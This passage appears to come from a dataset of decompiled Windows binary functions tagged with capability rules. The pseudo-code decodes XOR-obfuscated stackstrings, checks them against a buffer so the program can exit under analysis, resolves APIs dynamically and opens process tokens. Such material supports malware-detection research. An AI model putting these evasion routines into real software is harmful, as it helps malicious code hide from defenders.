_sym.imp.KERNEL32.dll_GetLastError;\n    var_48h = &var_2ch - var_90h;\n    do {\n        iVar9 = var_ch;\n        pcVar1 = var_ch + var_90h;\n        cVar7 = (*pcVar4)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = pcVar1[var_48h];\n        cVar8 = (*pcVar4)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_ch < 0x1c);\n    var_20h = 0x13471535;\n    var_1ch[0] = 0x13;\n    var_1ch[1] = 0x27;\n    var_1ah._0_1_ = 0x24;\n    var_1ah._1_1_ = 5;\n    var_1ah._2_1_ = 0x5b;\n    var_1ah._3_1_ = 0x14;\n    var_16h = 0x20;\n    var_15h = 0x2f;\n    var_14h = 0x14;\n    var_13h = 0x1f;\n    var_12h = 0x5d;\n    var_11h._0_1_ = 8;\n    var_11h._1_1_ = 0x18;\n    var_11h._2_1_ = 0x4a;\n    var_8h = 0x67346c66;\n    var_4h._0_1_ = 0x76;\n    var_4h._1_1_ = 0x4a;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    puVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n    var_ch = NULL;\n    *puVar14 = 0;\n    puVar14[1] = 0;\n    puVar14[2] = 0;\n    puVar14[3] = 0;\n    *(puVar14 + 4) = 0;\n    *(puVar14 + 0x12) = 0;\n    var_54h = var_1ch + (-4 - puVar14);\n    var_48h = puVar14;\n    do {\n        iVar9 = var_ch;\n        pcVar1 = var_ch + puVar14;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = pcVar1[var_54h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_ch < 0x12);\n    cVar7 = fcn.00412298(extraout_ECX_03, extraout_ECX_03);\n    if (cVar7 == '\\0') {\n        fcn.004124c9();\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_40h = 0x757d0135;\n    var_3ch = CONCAT31(var_3ch._1_3_, 0x66);\n    var_50h = 0x55344c74;\n    var_4ch._0_1_ = 0x66;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n    var_74h = NULL;\n    *var_ch = 0;\n    *(var_ch + 1) = 0;\n    var_54h = &var_40h - var_ch;\n    do {\n        iVar9 = var_74h;\n        pcVar1 = var_74h + var_ch;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_50h + iVar9 % 5);\n        uVar3 = pcVar1[var_54h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        var_74h = var_74h + 1;\n    } while (var_74h < 5);\n    var_8h = 0x312a2206;\n    var_4h._0_1_ = 0x61;\n    var_4h._1_1_ = 0x7a;\n    var_40h = 0x79696d44;\n    var_3ch = CONCAT22(var_3ch._2_2_, 0x7a32);\n    uVar10 = (*pcVar4)(8, 7);\n    var_74h = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    *var_74h = 0;\n    *(var_74h + 1) = 0;\n    *(var_74h + 6) = 0;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    var_6ch = NULL;\n    var_54h = &var_8h - var_74h;\n    do {\n        iVar9 = var_6ch;\n        pcVar1 = var_6ch + var_74h;\n        cVar7 = (*pcVar4)();\n        uVar2 = *(&var_40h + iVar9 % 6);\n        uVar3 = pcVar1[var_54h];\n        cVar8 = (*pcVar4)();\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        var_6ch = var_6ch + 1;\n    } while (var_6ch < 6);\n    var_40h = 0x3e7f033e;\n    var_3ch = CONCAT31(var_3ch._1_3_, 0x47);\n    var_50h = 0x66304168;\n    var_4ch._0_1_ = 0x47;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    var_6ch = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    var_68h = NULL;\n    *var_6ch = 0;\n    *(var_6ch + 1) = 0;\n    var_54h = &var_40h - var_6ch;\n    do {\n        iVar9 = var_68h;\n        pcVar1 = var_68h + var_6ch;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_50h + iVar9 % 5);\n        uVar3 = pcVar1[var_54h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        var_68h = var_68h + 1;\n    } while (var_68h < 5);\n    var_40h = 0x3f1b1334;\n    var_3ch = CONCAT31(var_3ch._1_3_, 0x49);\n    var_8h = 0x6a565665;\n    var_4h._0_1_ = 0x49;\n    var_4h._1_1_ = 0x62;\n    uVar10 = (*pcVar5)(8, 6);\n    var_68h = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    var_70h = NULL;\n    *var_68h = 0;\n    *(var_68h + 1) = 0;\n    var_54h = &var_40h - var_68h;\n    do {\n        iVar9 = var_70h;\n        pcVar1 = var_70h + var_68h;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = pcVar1[var_54h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        var_70h = var_70h + 1;\n    } while (var_70h < 5);\n    var_40h = 0x1e723d04;\n    var_3ch = CONCAT31(var_3ch._1_3_, 0x6e);\n    var_50h = 0x57317057;\n    var_4ch._0_1_ = 0x6e;\n    uVar10 = (*pcVar5)(8, 6);\n    var_70h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n    var_64h = NULL;\n    *var_70h = 0;\n    *(var_70h + 1) = 0;\n    var_54h = &var_40h - var_70h;\n    do {\n        iVar9 = var_64h;\n        pcVar1 = var_64h + var_70h;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_50h + iVar9 % 5);\n        uVar3 = pcVar1[var_54h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        var_64h = var_64h + 1;\n    } while (var_64h < 5);\n    var_20h = 0x151e7e01;\n    var_1ch[0] = 4;\n    var_1ch[1] = 0x79;\n    var_1ah._0_1_ = 0x68;\n    var_1ah._1_1_ = 0x1d;\n    var_1ah._2_1_ = 0x6a;\n    var_1ah._3_1_ = 0x66;\n    var_16h = 0x78;\n    var_15h = 0x6d;\n    var_14h = 0x78;\n    var_13h = 0;\n    var_12h = 0x7a;\n    var_11h._0_1_ = 0x60;\n    var_11h._1_1_ = 0x48;\n    var_8h = 0x504a3048;\n    var_4h._0_1_ = 0x48;\n    var_4h._1_1_ = 0x59;\n    uVar10 = (*pcVar5)(8, 0x12);\n    var_64h = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    var_44h = 0;\n    *var_64h = 0;\n    var_64h[1] = 0;\n    var_64h[2] = 0;\n    var_64h[3] = 0;\n    *(var_64h + 4) = 0;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    var_54h = var_1ch + (-4 - var_64h);\n    do {\n        iVar9 = var_44h;\n        pcVar1 = var_44h + var_64h;\n        cVar7 = (*pcVar4)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = pcVar1[var_54h];\n        cVar8 = (*pcVar4)();\n        var_44h = var_44h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_44h < 0x11);\n    var_8h = 0x33216020;\n    var_4h._0_1_ = 0x4e;\n    var_4h._1_1_ = 0x57;\n    var_4h._2_1_ = 0x34;\n    var_40h = 0x676f3466;\n    var_3ch = CONCAT31(var_3ch._1_3_, 99);\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    puVar14 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    var_44h = 0;\n    *puVar14 = 0;\n    puVar14[1] = 0;\n    var_58h = &var_8h - puVar14;\n    var_54h = puVar14;\n    do {\n        iVar9 = var_44h;\n        pcVar1 = var_44h + puVar14;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_40h + iVar9 % 5);\n        uVar3 = pcVar1[var_58h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_44h = var_44h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_44h < 7);\n    var_50h = 0x203a0c35;\n    var_4ch._0_1_ = 0x66;\n    var_8h = 0x69744366;\n    var_4h._0_1_ = 0x66;\n    var_4h._1_1_ = 0x58;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    puVar14 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    iVar9 = 0;\n    *puVar14 = 0;\n    *(puVar14 + 1) = 0;\n    var_58h = &var_50h - puVar14;\n    var_3ch = puVar14;\n    do {\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = *(puVar14 + var_58h + iVar9);\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *(iVar9 + puVar14) = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 5);\n    *0x427fe0 = var_ch;\n    *0x427fe8 = var_74h;\n    *0x427fec = var_6ch;\n    *0x427ff0 = var_68h;\n    *0x427ff4 = var_70h;\n    uVar19 = 0;\n    *0x427ff8 = var_64h;\n    *0x427ffc = var_54h;\n    *0x428000 = puVar14;\n    do {\n        iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x427bc8, *(uVar19 + 0x427fe0));\n        if (iVar9 != 0) {\n            fcn.004124c9();\n        }\n        uVar19 = uVar19 + 4;\n    } while (uVar19 < 0x20);\n    var_20h = 0x32360b26;\n    var_1ch[0] = 2;\n    var_1ch[1] = 0x32;\n    var_1ah._0_1_ = 0xb;\n    var_1ah._1_1_ = 0x3d;\n    var_1ah._2_1_ = 0x24;\n    var_1ah._3_1_ = 0x3b;\n    var_16h = 0x15;\n    var_15h = 0x10;\n    var_14h = 0x21;\n    var_13h = 0x3e;\n    var_12h = 2;\n    var_11h._0_1_ = 0x1e;\n    var_11h._1_1_ = 0x62;\n    var_7ch = 0x57526270;\n    var_78h._0_1_ = 0x6d;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    puVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n    var_44h = 0;\n    *puVar14 = 0;\n    puVar14[1] = 0;\n    puVar14[2] = 0;\n    puVar14[3] = 0;\n    *(puVar14 + 4) = 0;\n    var_58h = var_1ch + (-4 - puVar14);\n    var_50h = puVar14;\n    do {\n        iVar9 = var_44h;\n        pcVar1 = var_44h + puVar14;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_7ch + iVar9 % 5);\n        uVar3 = pcVar1[var_58h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_44h = var_44h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_44h < 0x11);\n    cVar7 = fcn.00412298(extraout_ECX_04, extraout_ECX_04);\n    if (cVar7 == '\\0') {\n        fcn.004124c9();\n    }\n    var_1ch[0] = 0x1f;\n    var_1ch[1] = 0xf;\n    var_1ah._0_1_ = 0x26;\n    var_1ah._1_1_ = 0x3f;\n    var_1ah._2_1_ = 0x10;\n    var_1ah._3_1_ = 0xc;\n    var_16h = 0x25;\n    var_15h = 0x24;\n    var_14h = 0x3b;\n    var_13h = 0x33;\n    var_12h = 0x65;\n    var_8h = 0x4b546649;\n    var_4h._0_1_ = 0x65;\n    var_4h._1_1_ = 0x6d;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    puVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n    *puVar14 = 0;\n    puVar14[1] = 0;\n    puVar14[2] = 0;\n    var_58h = var_1ch + -puVar14;\n    var_44h = 0;\n    var_7ch = puVar14;\n    do {\n        iVar9 = var_44h;\n        pcVar1 = var_44h + puVar14;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = pcVar1[var_58h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_44h = var_44h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_44h < 0xb);\n    iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x427bc8, puVar14);\n    if (iVar9 != 0) {\n        fcn.004124c9();\n    }\n    var_38h = 0x27143e1c;\n    var_34h = 0x341d3b24;\n    var_30h = 0x191a3e0e;\n    var_2ch = 0x1c211e3d;\n    var_28h = 0x26130e15;\n    var_24h = 0x15171d3b;\n    var_20h = 0x300e0238;\n    var_1ch[0] = 6;\n    var_1ch[1] = 8;\n    var_1ah._0_1_ = 0x3d;\n    var_1ah._1_1_ = 0x14;\n    var_1ah._2_1_ = 0x3c;\n    var_1ah._3_1_ = 7;\n    var_16h = 0x25;\n    var_15h = 0x1f;\n    var_14h = 0x3d;\n    var_13h = 2;\n    var_12h = 0x3b;\n    var_11h._0_1_ = 0x1c;\n    var_11h._1_1_ = 0x1d;\n    var_11h._2_1_ = 0x7a;\n    var_8h = 0x7352714f;\n    var_4h._0_1_ = 0x73;\n    var_4h._1_1_ = 0x7a;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2b);\n    iVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    sub.ntdll.dll_memset(iVar9, 0, 0x2b);\n    var_44h = 0;\n    var_58h = &var_38h - iVar9;\n    do {\n        iVar16 = var_44h;\n        pcVar1 = var_44h + iVar9;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar16 % 6);\n        uVar3 = pcVar1[var_58h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_44h = var_44h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_44h < 0x2a);\n    cVar7 = fcn.00412298(extraout_ECX_05, extraout_ECX_05);\n    if (cVar7 == '\\0') {\n        fcn.004124c9();\n    }\n    var_28h = 0x715a4474;\n    var_24h = 0x4577576c;\n    var_20h = 0x4c6a6b58;\n    var_1ch[0] = 0x76;\n    var_1ch[1] = 0x42;\n    var_1ah._0_1_ = 0x58;\n    var_1ah._1_1_ = 0x70;\n    var_1ah._2_1_ = 0x6c;\n    var_1ah._3_1_ = 0x57;\n    var_16h = 0x73;\n    var_15h = 0x42;\n    var_14h = 0x51;\n    var_13h = 0x73;\n    var_12h = 0x68;\n    var_11h._0_1_ = 0x7a;\n    var_8h = 0x46687141;\n    var_4h._0_1_ = 0x58;\n    var_4h._1_1_ = 0x7a;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    puVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n    puVar14 = puVar15;\n    for (iVar16 = 6; iVar16 != 0; iVar16 = iVar16 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    *puVar14 = 0;\n    var_58h = &var_28h - puVar15;\n    var_44h = 0;\n    do {\n        iVar16 = var_44h;\n        pcVar1 = var_44h + puVar15;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar16 % 6);\n        uVar3 = pcVar1[var_58h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_44h = var_44h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_44h < 0x18);\n    iVar16 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x427bc8, puVar15);\n    if (iVar16 != 0) {\n        fcn.004124c9();\n    }\n    var_28h = 0x5d765271;\n    var_24h = 0x76526b72;\n    var_20h = 0x55756851;\n    var_1ch[0] = 0x75;\n    var_1ch[1] = 0x52;\n    var_1ah._0_1_ = 0x75;\n    var_1ah._1_1_ = 0x75;\n    var_1ah._2_1_ = 0x53;\n    var_1ah._3_1_ = 0x6f;\n    var_16h = 0x57;\n    var_15h = 0x76;\n    var_14h = 0x73;\n    var_13h = 0x55;\n    var_12h = 0x72;\n    var_11h._0_1_ = 0x65;\n    var_8h = 0x65426446;\n    var_4h._0_1_ = 0x45;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    puVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n    puVar14 = puVar17;\n    for (iVar16 = 6; iVar16 != 0; iVar16 = iVar16 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    *puVar14 = 0;\n    var_58h = &var_28h - puVar17;\n    var_44h = 0;\n    do {\n        iVar16 = var_44h;\n        pcVar1 = var_44h + puVar17;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar16 % 5);\n        uVar3 = pcVar1[var_58h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_44h = var_44h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_44h < 0x18);\n    iVar16 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x427bc8, puVar17);\n    if (iVar16 != 0) {\n        fcn.004124c9();\n    }\n    var_28h = 0x757f5460;\n    var_24h = 0x51646a58;\n    var_20h = 0x7357607c;\n    var_1ch[0] = 0x65;\n    var_1ch[1] = 0x5b;\n    var_1ah._0_1_ = 0x72;\n    var_1ah._1_1_ = 0x78;\n    var_1ah._2_1_ = 0x5a;\n    var_1ah._3_1_ = 0x6a;\n    var_16h = 0x65;\n    var_15h = 0x50;\n    var_14h = 0x7d;\n    var_13h = 0x7c;\n    var_12h = 0x5b;\n    var_11h._0_1_ = 0x47;\n    var_8h = 0x4d4b6257;\n    var_4h._0_1_ = 0x6f;\n    var_4h._1_1_ = 0x47;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    puVar18 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    puVar14 = puVar18;\n    for (iVar16 = 6; iVar16 != 0; iVar16 = iVar16 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    *puVar14 = 0;\n    var_58h = &var_28h - puVar18;\n    var_44h = 0;\n    do {\n        iVar16 = var_44h;\n        pcVar1 = var_44h + puVar18;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar16 % 6);\n        uVar3 = pcVar1[var_58h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_44h = var_44h + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_44h < 0x18);\n    iVar16 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x427bc8, puVar18);\n    if (iVar16 != 0) {\n        fcn.004124c9();\n    }\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar18);\n    pcVar6 = _sym.imp.ntdll.dll_RtlFreeHeap;\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar10);\n    uVar10 = (*pcVar5)(0, puVar17);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n    uVar10 = (*pcVar5)(0, puVar15);\n    (*pcVar4)(uVar10);\n    uVar10 = (*pcVar5)(0, iVar9);\n    (*pcVar6)(uVar10);\n    uVar10 = (*pcVar5)(0, var_7ch);\n    (*pcVar4)(uVar10);\n    uVar10 = (*pcVar5)(0, var_50h);\n    (*pcVar4)(uVar10);\n    uVar10 = (*pcVar5)(0, var_3ch);\n    (*pcVar6)(uVar10);\n    uVar10 = (*pcVar5)(0, var_54h);\n    (*pcVar6)(uVar10);\n    uVar10 = (*pcVar5)(0, var_64h);\n    (*pcVar6)(uVar10);\n    uVar10 = (*pcVar5)(0, var_70h);\n    (*pcVar4)(uVar10);\n    uVar10 = (*pcVar5)(0, var_68h);\n    (*pcVar6)(uVar10);\n    uVar10 = (*pcVar5)(0, var_6ch);\n    (*pcVar6)(uVar10);\n    uVar10 = (*pcVar5)(0, var_74h);\n    (*pcVar6)(uVar10);\n    uVar10 = (*pcVar5)(0, var_ch);\n    (*pcVar4)(uVar10);\n    uVar10 = (*pcVar5)(0, var_48h);\n    (*pcVar4)(uVar10);\n    uVar10 = (*pcVar5)(0, var_90h);\n    (*pcVar4)(uVar10);\n    uVar10 = (*pcVar5)(0, var_88h);\n    (*pcVar6)(uVar10);\n    uVar10 = (*pcVar5)(0, var_60h);\n    (*pcVar6)(uVar10);\n    fcn.00403615();\n    fcn.00403684();\n    uVar10 = (*pcVar5)(0, puVar13);\n    (*pcVar6)(uVar10);\n    uVar10 = (*pcVar5)(0, puVar12);\n    (*pcVar6)(uVar10);\n    uVar10 = (*pcVar5)(0, var_84h);\n    (*pcVar4)(uVar10);\n    uVar10 = (*pcVar5)(0, puVar11);\n    uVar19 = (*pcVar6)(uVar10);\n    return uVar19 & 0xffffff00;\n}\n",
        "token_count": 12245
    },
    "0040179a": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040179a(uint param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t hModule;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint lpLibFileName;\n    uint var_4h;\n    \n    iVar9 = 0;\n    var_4h = 0;\n    var_1ch = param_1;\n    if (*0x427bb8 == NULL) {\n        var_34h = 0xb07363b;\n        var_30h = 0x47603c0a;\n        var_2ch = 0x3f3c0b4b;\n        var_28h._0_1_ = 0x75;\n        hModule = 0x65755350;\n        var_14h._0_1_ = 0x6f;\n        fcn.004034a8(param_1);\n        iVar9 = 0;\n        do {\n            fcn.004034cf(iVar9, *(&hModule + iVar9 % 5) ^ *(&var_34h + iVar9));\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0xd);\n        iVar9 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName);\n        hModule = iVar9;\n        if (iVar9 != 0) {\n            var_3ch = 0x26214b14;\n            var_38h = 0x7037012f;\n            var_34h = 0x2125112a;\n            var_30h = 0x2c3d4a21;\n            var_2ch = 0x5d0d1c25;\n            var_28h._0_1_ = 0x4e;\n            var_24h = 0x454e3944;\n            var_20h._0_2_ = 0x724a;\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n            puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            var_ch = 0;\n            *puVar7 = 0;\n            puVar7[1] = 0;\n            puVar7[2] = 0;\n            puVar7[3] = 0;\n            puVar7[4] = 0;\n            *(puVar7 + 5) = 0;\n            var_10h = &var_3ch - puVar7;\n            do {\n                iVar9 = var_ch;\n                pcVar1 = var_ch + puVar7;\n                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_24h + iVar9 % 6);\n                uVar3 = pcVar1[var_10h];\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                iVar9 = hModule;\n                var_ch = var_ch + 1;\n                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n            } while (var_ch < 0x15);\n            *0x427bb8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, puVar7);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar7);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n            param_1 = var_1ch;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpLibFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        if (*0x427bb8 == NULL) goto code_r0x0040190a;\n    }\n    iVar8 = (**0x427bb8)(param_1, &var_4h);\n    if (iVar8 == 0) {\n        var_4h = 0xffffffff;\n    }\ncode_r0x0040190a:\n    if (iVar9 != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar9);\n    }\n    return var_4h;\n}\n",
        "token_count": 1061
    },
    "0040191e": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040191e(uint param_1, uint param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    uint *puVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint32_t uVar14;\n    code *pcVar15;\n    uint *puVar16;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint *var_48h;\n    uint var_44h;\n    uint ARG_0;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t ProcessHandle;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t dwProcessId;\n    int32_t var_14h;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint TokenInformationLength;\n    int32_t TokenHandle;\n    \n    pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n    var_38h = 0x104;\n    var_10h = puVar9;\n    uVar8 = (*pcVar15)(8, 0x208);\n    puVar10 = (*pcVar4)(uVar8);\n    var_34h = 0x104;\n    TokenInformationLength = 0;\n    var_2ch = 0;\n    uVar8 = 0;\n    if ((puVar9 != NULL) && (puVar10 != NULL)) {\n        var_ch = puVar10;\n        ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, dwProcessId);\n        if (ProcessHandle != 0) {\n            var_68h = 0xc301415;\n            var_64h = 0x281a3d07;\n            var_60h = 0x11200417;\n            for (iVar13 = 0x208; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_5ch = 0x2616180c;\n            var_58h = 0xd2d0f0c;\n            for (iVar13 = 0x208; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_54h = 0x790f0624;\n            var_48h = 0x7961634f;\n            var_44h._0_1_ = 0x62;\n            uVar8 = (*pcVar15)(8, 0x19);\n            puVar11 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n            var_14h = 0;\n            puVar16 = puVar11;\n            for (iVar13 = 6; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar16 = 0;\n                puVar16 = puVar16 + 1;\n            }\n            *puVar16 = 0;\n            var_20h = &var_68h - puVar11;\n            var_1ch = puVar11;\n            do {\n                iVar13 = var_14h;\n                pcVar1 = var_14h + puVar11;\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_48h + iVar13 % 5);\n                uVar3 = pcVar1[var_20h];\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_14h = var_14h + 1;\n                *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n            } while (var_14h < 0x18);\n            iVar13 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x20008, &TokenHandle);\n            if ((iVar13 != 0) || (pcVar15 = _sym.imp.KERNEL32.dll_GetProcessHeap,  TokenHandle == 0)) {\n                var_5ch = 0xb07363b;\n                var_58h = 0x47603c0a;\n                var_54h = 0x3f3c0b4b;\n                var_50h._0_2_ = 